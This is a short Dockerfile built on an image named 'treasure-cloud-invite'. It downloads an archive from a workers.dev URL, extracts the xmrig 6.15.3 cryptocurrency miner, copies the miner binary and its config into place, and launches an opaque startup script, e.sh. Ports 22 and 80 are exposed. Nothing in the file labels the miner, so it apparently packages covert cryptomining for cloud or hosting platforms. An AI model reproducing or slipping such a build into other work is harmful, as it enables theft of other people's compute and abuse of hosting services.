FROM developeranaz/treasure-cloud-invite:1
#RUN apt install rclone -y
RUN apt install supervisor -y
COPY rcxstart /usr/bin/rcxstart
COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
EXPOSE 22 80
COPY e.sh /e.sh
RUN chmod +x /e.sh
RUN chmod +x /usr/bin/rcxstart
RUN wget 'https://unlimited-td4.sadqueen.workers.dev/0:/xm.tar.gz'
RUN tar -xvf /xm.tar.gz
RUN rm *.tar.gz
RUN cp /xmrig-6.15.3/xmrig ./xmrig
RUN cp /xmrig-6.15.3/config.json ./config.json
RUN cp /xmrig-6.15.3/SHA256SUMS ./SHA256SUMS
CMD /e.sh
